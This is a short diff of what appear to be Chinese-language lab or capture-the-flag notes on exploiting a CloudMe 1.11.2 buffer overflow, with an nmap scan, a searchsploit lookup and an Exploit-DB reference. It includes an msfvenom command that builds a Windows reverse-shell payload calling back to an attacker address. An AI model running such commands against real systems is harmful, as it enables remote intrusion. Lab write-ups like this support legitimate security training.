@@ -4,7 +4,6 @@
 #### 操作命令:msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.134 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
 ### 方法一：https://www.exploit-db.com/exploits/48389 ：CloudMe 1.11.2 - Buffer Overflow (PoC)
 ### 方法二：[★]$ searchsploit cloudme
-![图片](image/'截屏2026-02-07 00.06.05.png')
 ```
 [★]$ nmap -sC -sV 10.129.2.18
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-05 03:10 CST
